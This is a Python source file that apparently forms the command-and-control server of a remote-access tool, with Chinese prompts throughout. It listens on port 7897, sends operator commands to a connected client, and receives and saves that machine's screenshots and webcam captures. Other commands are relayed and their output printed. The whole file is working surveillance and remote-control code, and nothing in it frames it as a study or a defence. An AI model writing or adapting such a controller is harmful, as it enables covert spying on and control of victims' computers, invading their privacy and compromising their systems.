import socket
import os

def start_server(host='', port=7897):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)

        print("等待连接...")
        conn, addr = s.accept()
        print("连接已建立：", addr)
        print("目前可用命令: 截图, 摄像头截图")

        try:
            while True:
                data = input('请输入要发送给客户端的数据（输入"exit"退出）：').strip()
                
                if not data:
                    print("空命令，未发送数据")
                    continue
                
                if data == "exit":
                    break

                if data in ["截图", "摄像头截图"]:
                    conn.sendall(data.encode())
                    
                    # 接收图片大小
                    img_size_data = conn.recv(100000).decode()
                    img_size = int(img_size_data) if img_size_data.isdigit() else 0
                    print(f"接收图片大小：{img_size} 字节")

                    if img_size == 0:
                        print("没有接收到图像数据")
                        continue

                    # 接收图片数据
                    img_data = b""
                    while len(img_data) < img_size:
                        packet = conn.recv(100000)
                        if not packet:
                            break
                        img_data += packet
                    
                    # 保存图片
                    img_path = "received_" + ("screenshot.jpg" if data == "截图" else "webcam_screenshot.jpg")
                    with open(img_path, "wb") as f:
                        f.write(img_data)
                    print(f"{data} 已保存为 {img_path}")
                else:
                    # 发送普通命令
                    conn.sendall(data.encode())
                    received_data = conn.recv(100000).decode()
                    print("接收到的数据：", received_data)

        except Exception as e:
            print("发生错误：", e)
        finally:
            conn.close()
            print("服务器运行结束。")

if __name__ == "__main__":
    start_server()
